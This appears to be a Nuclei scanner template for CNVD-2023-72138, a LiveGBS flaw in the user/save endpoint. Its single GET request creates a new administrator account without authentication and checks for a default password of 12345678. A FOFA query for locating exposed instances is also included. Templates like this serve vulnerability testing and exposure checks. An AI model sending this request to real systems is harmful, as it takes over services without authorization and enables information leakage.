http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"DefaultUserPassword": "12345678"'
    - ID
  - part: content_type
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - "{{BaseURL}}/api/v1/user/save?ID=&Username={{user}}&Role=\u7BA1\u7406\u5458&Enable=true"
id: CNVD-2023-72138
info:
  author: pussycat0x
  description: 'There is a logic defect vulnerability in LiveGBS user/save. Unauthenticated
    attackers can exploit this vulnerability to arbitrarily add users, resulting in
    the takeover of background services and causing adverse effects such as information
    leakage.

    '
  metadata:
    fofa-query: icon_hash="-206100324"
    max-request: 1
    verified: true
  name: LiveGBS user/save - Logical Flaw
  reference:
  - https://github.com/wy876/POC/blob/main/LiveGBS%E5%AD%98%E5%9C%A8%E9%80%BB%E8%BE%91%E7%BC%BA%E9%99%B7%E6%BC%8F%E6%B4%9E(CNVD-2023-72138).md
  severity: high
  tags: cnvd,cnvd2023,livegbs,info-leak,vuln
variables:
  user: '{{to_lower(rand_base(5))}}'
